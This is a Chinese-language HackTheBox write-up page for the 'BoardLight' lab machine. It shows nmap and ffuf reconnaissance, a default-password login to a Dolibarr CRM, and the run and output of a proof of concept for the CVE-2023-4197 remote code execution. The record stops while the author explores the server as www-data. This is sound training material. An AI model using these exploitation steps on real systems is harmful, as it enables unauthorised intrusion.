@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P BoardLight​​ https:&#x2F;&#x2F;www.hackthebox.com&#x2F;achievement&#x2F;machine&#x2F;463126&#x2F;603 笑死，簡單機器裏得到歷史以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - BoardLight">
+<meta property="og:url" content="https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P BoardLight​​ https:&#x2F;&#x2F;www.hackthebox.com&#x2F;achievement&#x2F;machine&#x2F;463126&#x2F;603 笑死，簡單機器裏得到歷史以">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526102740-xeh1ga9.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526103245-4h2cmq7.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526103338-3xfb3d6.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526103354-7j0saag.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526103615-nflsort.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526103700-4z4wqwy.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526104142-rx48hdg.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526104525-67kxtve.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526104545-wecr3mc.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526104630-9hu2b56.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526104804-pcnrzcg.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526104859-o5tkfoj.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526111241-49u5xsd.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526111441-pz6bcfi.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526111715-iedjcp1.png">
+<meta property="article:published_time" content="2024-05-25T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-09-30T07:27:22.196Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526102740-xeh1ga9.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - BoardLight</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/06/03/2024-htb-machine/22-Freelancer/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/05/25/2024-htb-machine/20-MagicGardens/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/&text=HackTheBox - Machine - BoardLight"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/&title=HackTheBox - Machine - BoardLight"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/&is_video=false&description=HackTheBox - Machine - BoardLight"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - BoardLight&body=Check out this article: https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/&title=HackTheBox - Machine - BoardLight"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/&title=HackTheBox - Machine - BoardLight"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/&title=HackTheBox - Machine - BoardLight"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/&title=HackTheBox - Machine - BoardLight"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/&name=HackTheBox - Machine - BoardLight&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/05/26/2024-htb-machine/21-BoardLight/&t=HackTheBox - Machine - BoardLight"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - BoardLight
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-25T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-05-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="BoardLight"><a href="#BoardLight" class="headerlink" title="BoardLight"></a>BoardLight</h1><p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526102740-xeh1ga9.png" alt="image">​</p>
+<p><a target="_blank" rel="noopener" href="https://www.hackthebox.com/achievement/machine/463126/603">https://www.hackthebox.com/achievement/machine/463126/603</a></p>
+<p>笑死，簡單機器裏得到歷史以來最好的成績。</p>
+<p>首先，注意到機器的 80 端口，發現運行的是 PHP，並且有一個子域名指向 Dolibarr 控制台。透過弱密碼的嘗試，成功登入後，隨即進行了漏洞搜索，找到了針對特定版本的遠程代碼執行（RCE）漏洞，並成功利用該漏洞執行了惡意代碼，獲得了 shell 訪問權限。接下來，進一步探索系統配置文件的位置，並透過暴力破解的方式獲得了用戶的密碼，最終登入了名為 larissa 的用戶。隨後，使用 linpeas 工具檢查系統，發現了一些可疑的 SUID 二進制文件，並尋找相應的利用腳本，最終成功提升至 root 權限。文章還提到了一些與系統監控相關的工具，例如 auditd，強調了在安全環境中監控系統行為的重要性，並指出常見的日誌管理解決方案，如 ELK 和 Splunk，能有效防止日誌被刪除或篡改。</p>
+<h2 id="0x1-nmap"><a href="#0x1-nmap" class="headerlink" title="0x1 nmap"></a>0x1 nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH0dV4gtJNo8ixEEBDxhUId6Pc/8iNLX16+zpUCIgmxxl5TivDMLg2JvXorp4F2r8ci44CESUlnMHRSYNtlLttiIZHpTML7ktFHbNexvOAJqE1lIlQlGjWBU1hWq6Y6n1tuUANOd5U+Yc0/h53gKu5nXTQTy1c9CLbQfaYvFjnzrR3NQ6Hw7ih5u3mEjJngP+Sq+dpzUcnFe1BekvBPrxdAJwN6w+MSpGFyQSAkUthrOE4JRnpa6jSsTjXODDjioNkp2NLkKa73Yc2DHk3evNUXfa+P8oWFBk8ZXSHFyeOoNkcqkPCrkevB71NdFtn3Fd/Ar07co0ygw90Vb2q34cu1Jo/1oPV1UFsvcwaKJuxBKozH+VA0F9hyriPKjsvTRCbkFjweLxCib5phagHu6K5KEYC+VmWbCUnWyvYZauJ1/t5xQqqi9UWssRjbE1mI0Krq2Zb97qnONhzcclAPVpvEVdCCcl0rYZjQt6VI1PzHha56JepZCFCNvX3FVxYzEk=</span><br><span class="line">|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK7G5PgPkbp1awVqM5uOpMJ/xVrNirmwIT21bMG/+jihUY8rOXxSbidRfC9KgvSDC4flMsPZUrWziSuBDJAra5g=</span><br><span class="line">|   256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:<span class="built_in">dd</span>:f4 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILHj/lr3X40pR3k9+uYJk4oSjdULCK0DlOxbiL66ZRWg</span><br><span class="line">80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html; charset=UTF-8).</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.4.41 (Ubuntu)</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br></pre></td></tr></table></figure>
+
+<p>就一個80，很明顯暗示從80端口開始入手。</p>
+<h2 id="0x2-80-web"><a href="#0x2-80-web" class="headerlink" title="0x2 80 - web"></a>0x2 80 - web</h2><p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526103245-4h2cmq7.png" alt="image">​</p>
+<p>可以看到是php，然後有一個domain，我會看到就隨手去掃一下，因爲怕忘記。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -u <span class="string">&quot;http://10.129.35.16&quot;</span>  -H <span class="string">&quot;Host: FUZZ.board.htb&quot;</span> -w /Tools/Wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 15949</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\     </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/     </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\    </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/    </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\     </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.0.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://10.129.35.16</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /Tools/Wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.board.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 15949</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 205ms]</span></span><br><span class="line"><span class="string">    * FUZZ: crm</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">:: Progress: [100000/100000] :: Job [1/1] :: 217 req/sec :: Duration: [0:08:22] :: Errors: 0 ::</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p>然後看到有一個crm的子域名，打開去看看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526103338-3xfb3d6.png" alt="image">​</p>
+<p>是 dolibarr 的控制臺，然後隨手猜一下弱密碼 <code>admin:admin</code>​ 結果進去了：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526103354-7j0saag.png" alt="image">​</p>
+<p>既然告訴你版本，而且有賬號密碼，那麽可以嘗試搜索</p>
+<p>搜索 <code>Dolibarr 17.0.0 auth exploit rce</code>​ ，看到這篇：<a target="_blank" rel="noopener" href="https://starlabs.sg/advisories/23/23-4197/">https://starlabs.sg/advisories/23/23-4197/</a></p>
+<p>乾脆直接扒下來試一下，結果運行的時候出現：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ python3 exppoc.py http://crm.board.htb/ admin admin <span class="built_in">whoami</span></span><br><span class="line">/home/mane/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.7) or chardet (5.1.0)/charset_normalizer (2.0.9) doesn<span class="string">&#x27;t match a supported version!</span></span><br><span class="line"><span class="string">  warnings.warn(&quot;urllib3 (&#123;&#125;) or chardet (&#123;&#125;)/charset_normalizer (&#123;&#125;) doesn&#x27;</span>t match a supported <span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">===== Dolibarr ERP CRM (v18.0.1) Improper Input Sanitization Vulnerability (CVE-2023-4197) =====</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Attempting to authenticate...</span></span><br><span class="line"><span class="string">[+] Authenticated successfully!</span></span><br><span class="line"><span class="string">[+] Attempting to create a website...</span></span><br><span class="line"><span class="string">[+] Created website name: &quot;</span>58e2fc79ff764e2b8081aa2615e20b61<span class="string">&quot;!</span></span><br><span class="line"><span class="string">[+] Attempting to create a web page...</span></span><br><span class="line"><span class="string">[+] Created web page name: &quot;</span>e4f0553cd2bf4cc3ac3bd6965d9c1501<span class="string">&quot;!</span></span><br><span class="line"><span class="string">[+] Attempting to modify the web page...</span></span><br><span class="line"><span class="string">[+] Web page modified successfully!</span></span><br><span class="line"><span class="string">[+] Triggering RCE now via: http://crm.board.htb/public/website/index.php?website=58e2fc79ff764e2b8081aa2615e20b61&amp;pageref=e4f0553cd2bf4cc3ac3bd6965d9c1501</span></span><br><span class="line"><span class="string">[+] RCE successful! Output of command:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;? echo system(&#x27;whoami&#x27;); ?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然後順著鏈接打開看看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526103615-nflsort.png" alt="image">​</p>
+<p>結果一片空白，不過看到源碼是inject成功，也就是說已經成功了一半，剩下的就看看這個poc的問題：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526103700-4z4wqwy.png" alt="image">​</p>
+<p>我嘗試把他改成 <code>&lt;?php</code>​ 會發生什麽，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ python3 exppoc.py http://crm.board.htb/ admin admin <span class="built_in">whoami</span></span><br><span class="line">/home/mane/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.7) or chardet (5.1.0)/charset_normalizer (2.0.9) doesn<span class="string">&#x27;t match a supported version!</span></span><br><span class="line"><span class="string">  warnings.warn(&quot;urllib3 (&#123;&#125;) or chardet (&#123;&#125;)/charset_normalizer (&#123;&#125;) doesn&#x27;</span>t match a supported <span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">===== Dolibarr ERP CRM (v18.0.1) Improper Input Sanitization Vulnerability (CVE-2023-4197) =====</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Attempting to authenticate...</span></span><br><span class="line"><span class="string">[+] Authenticated successfully!</span></span><br><span class="line"><span class="string">[+] Attempting to create a website...</span></span><br><span class="line"><span class="string">[+] Created website name: &quot;</span>228265ffefe7419dba42c25556a57248<span class="string">&quot;!</span></span><br><span class="line"><span class="string">[+] Attempting to create a web page...</span></span><br><span class="line"><span class="string">[+] Created web page name: &quot;</span>87e2f2e3da704faf960ca982973013a5<span class="string">&quot;!</span></span><br><span class="line"><span class="string">[+] Attempting to modify the web page...</span></span><br><span class="line"><span class="string">[+] Web page modified successfully!</span></span><br><span class="line"><span class="string">[+] Triggering RCE now via: http://crm.board.htb/public/website/index.php?website=228265ffefe7419dba42c25556a57248&amp;pageref=87e2f2e3da704faf960ca982973013a5</span></span><br><span class="line"><span class="string">[+] RCE successful! Output of command:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">www-data</span></span><br></pre></td></tr></table></figure>
+
+<p>結果成功的運行，於是得到了RCE。</p>
+<h2 id="0x3-shell-as-www-data"><a href="#0x3-shell-as-www-data" class="headerlink" title="0x3 shell as www-data"></a>0x3 shell as www-data</h2><p>拿到了shell，不如看一下配置文件，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@boardlight:~$ <span class="built_in">ls</span></span><br><span class="line">html</span><br><span class="line">www-data@boardlight:~$ <span class="built_in">cd</span> html/</span><br><span class="line">www-data@boardlight:~/html$ <span class="built_in">ls</span></span><br><span class="line">board.htb  crm.board.htb</span><br><span class="line">www-data@boardlight:~/html$ <span class="built_in">cd</span> crm.board.htb/</span><br><span class="line">www-data@boardlight:~/html/crm.board.htb$ <span class="built_in">ls</span></span><br><span class="line">COPYING  COPYRIGHT  ChangeLog  DCO  README-FR.md  README.md  SECURITY.md  composer.json.disabled  documents  htdocs  nightwatch.conf.js  phpstan.neon  robots.txt  scripts</span><br><span class="line">www-data@boardlight:~/html/crm.board.htb$ </span><br></pre></td></tr></table></figure>
+
+<p>隨便網上搜索一下配置文件在哪裏，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-wT0Y0vcJ070N8fQ0-BoardLight/image-20240526104142-rx48hdg.png" alt="image">​</p>
+<p>‍</p>
+<blockquote>
